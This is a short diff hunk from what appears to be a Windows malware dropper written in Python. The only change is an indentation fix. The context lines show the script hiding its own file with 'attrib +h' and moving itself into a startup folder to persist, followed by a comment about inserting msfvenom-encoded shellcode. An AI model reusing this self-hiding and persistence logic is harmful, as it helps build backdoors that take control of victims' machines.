@@ -15,7 +15,7 @@ os.system("attrib +h %s" %script_name)
 if os.path.isfile(script_name) == True:
     pass
 else:
-	shutil.move(source,star_dir)
+    shutil.move(source,star_dir)
 
 #thanks to the coder of the code below
 #shellcode here support msfvenom encoders
